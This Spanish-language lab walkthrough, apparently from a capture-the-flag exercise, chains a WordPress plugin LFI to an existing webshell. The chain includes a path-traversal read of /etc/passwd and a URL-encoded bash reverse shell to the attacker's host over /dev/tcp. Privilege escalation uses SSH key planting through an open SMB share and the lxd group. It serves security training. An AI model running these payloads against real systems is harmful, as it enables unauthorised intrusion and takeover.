PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10123/tcp open  unknown

-Hacemos Fuzzing al puerto 80 y encontramos la ruta /wp , la cual nos lleva a un Wordpress

-Enumeramos el Wordpress con wpscan y encontramos un plugin vulnerable:
	-wpscan --url http://192.168.236.135/wp/ -e p,u
		[i] Plugin(s) Identified:
			[+] **gracemedia-media-player Versión 1.0**

-El Plugin es vulnerable a Local File Inclusion (LFI):
	REF: https://www.exploit-db.com/exploits/46537

-Esta es la ruta vulnerable:
	-http://192.168.236.135/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
		-VEMOS EL /ETC/PASSWD!!

-Intentamos enumerar la clave privada del usuario jarves o listar los Logs de Apache y SSH , **SIN ÉXITO**

-Nos vamos a la siguiente ruta y encontramos que en el direcorio /home del usuario 'jarves' hay una webshell:
	-http://192.168.236.135:10123/upload/shell.php

-Hacemos una petición con Curl para ver su contenido:
	-curl -s -X GET 'http://192.168.236.135:10123/upload/shell.php'       
		![[Pasted image 20250505112125.png]]

-Aprovechamos el LFI del puerto 80 para interactuar con la webshell que hay en el directorio del usuario 'jarves', para ganar acceso a la máquina:
	-Ejecutamos un comando para confirmar:
		-http://192.168.236.135/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../home/jarves/upload/shell.php&cmd=id
			uid=33(www-data) gid=33(www-data) groups=33(www-data)
	-Nos mandamos una RS:
		-http://192.168.236.135/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../home/jarves/upload/shell.php&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.236.128/1234%200%3E%261%27
			**www-data@hackerctflab:/$ whoami**
				**www-data**

## Escalada de Privilegios

-Vemos que nos podemos autenticar por smb y tenemos permisos de escritura en el directorio del usuario 'jarves' y nos crea archivos y directorios con los permisos de jarves.

-Generamos un par de claves de SSH (Privada y pública) con la herramienta **ssh-keygen** para autenticarnos por SSH y pivotar al usuario 'jarves':
	-ssh-keygen
		-Le damos enter a todo
	-Renombramos la CLAVE PÚBLICA como --> authorized_keys

-Nos autenticamos y subimos la clave pública:
	-smbclient -N //192.168.236.135/welcome
		-smb: \> mkdir .ssh
			-smb: \.ssh\> put authorized_keys

-Desde la máquina vemos que se ha subido correctamente:
	-rwxr--r-- 1 jarves jarves   93 May  5 09:56 authorized_keys

-Damos los permisos a la CLAVE PRIVADA y nos autenticamos con el usuario jarves:
	-chmod 600 id_rsa
	-ssh -i id_rsa jarves@192.168.236.135
		**jarves@hackerctflab:~$ whoami**
			**jarves**

-Vemos los grupos del usuario jarves:
	-jarves@hackerctflab:~$ id
		**116(lxd)**

-Escalamos Privilegios con el método 2 de este recurso:
	https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation



